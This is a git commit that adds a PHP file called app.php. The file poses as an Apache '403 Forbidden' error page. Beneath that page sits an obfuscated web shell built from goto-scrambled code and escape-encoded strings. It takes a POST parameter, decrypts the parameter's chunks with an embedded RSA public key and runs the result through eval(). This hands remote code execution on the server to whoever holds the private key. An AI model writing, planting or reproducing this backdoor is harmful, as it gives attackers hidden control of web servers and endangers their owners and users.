89720ca799fd7f9af4037ee646c3deb14dc97c38
aoligei126 <shuaishuai0479@gmail.com>
2025-09-04 01:21:44 +0800

    app.php

---
+++ app.php
@@ -0,0 +1,12 @@
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>403 Forbidden</title>
+</head><body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this resource.</p>
+<hr><address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12 Port 80</address>
+</body></html>
+<html>
+<pre>
+<?php
+ goto NT4Yp; R56QC: $mpvHd = ''; goto zc7jL; cPjlS: $JKVx2 = "\55\55\x2d\x2d\55\x42\x45\x47\x49\x4e\x20\120\125\x42\114\111\x43\40\x4b\105\x59\55\x2d\55\x2d\x2d\xa\115\111\107\x66\x4d\101\60\x47\x43\x53\161\x47\x53\x49\x62\x33\104\x51\x45\x42\x41\x51\x55\x41\x41\x34\107\x4e\101\x44\x43\102\x69\121\113\102\x67\x51\103\57\x33\x76\161\67\155\x56\x4a\x76\154\144\x6f\x4c\x32\x45\x7a\x57\170\152\147\61\x53\x48\x56\x6b\12\x6f\x71\x6e\170\x57\x46\60\160\x75\x47\x6b\160\171\66\110\x31\x6c\112\x38\x6c\x6f\115\127\161\x33\172\x36\62\x32\156\x42\x70\x78\x72\162\x4a\x68\x67\x73\x62\x46\x78\x53\130\123\x67\x41\150\x62\x30\x2b\132\x64\71\132\166\x6a\x55\130\x45\x73\x64\101\x52\12\123\x43\x56\x71\x2b\147\126\x58\x41\164\x4d\x38\x34\x31\102\163\x73\162\x70\114\154\117\x76\x48\151\105\67\x68\x74\x4c\x31\163\144\x75\x45\x4d\61\x53\x68\x51\x52\x43\115\x57\145\120\x4a\x63\x30\x74\x73\155\64\126\113\x38\143\x6e\x4b\x5a\x7a\145\x69\70\12\x38\x49\132\53\152\172\142\62\65\x4f\64\x4f\x46\x68\x72\x78\x63\x51\111\x44\x41\x51\x41\102\12\55\x2d\x2d\55\55\x45\x4e\104\40\120\x55\x42\114\x49\103\x20\x4b\x45\x59\55\x2d\x2d\55\55"; goto Ojkdc; Ojkdc: $Pdom_ = explode("\x7c", $mpvHd); goto VLiVM; Zj_4c: l_1Cm: goto HGoE1; NT4Yp: $mpvHd = @$_POST["\x61\x6e\x74"]; goto cPjlS; VLiVM: $JKVx2 = openssl_pkey_get_public($JKVx2); goto R56QC; zc7jL: foreach ($Pdom_ as $H0KqI) { goto z_3z4; jvJut: N4CYd: goto gSOjO; N0b3h: aW_uK: goto jvJut; z_3z4: if (!openssl_public_decrypt(base64_decode($H0KqI), $taUJ4, $JKVx2)) { goto aW_uK; } goto rWYNS; rWYNS: $mpvHd .= $taUJ4; goto N0b3h; gSOjO: } goto Zj_4c; HGoE1: eval($mpvHd);
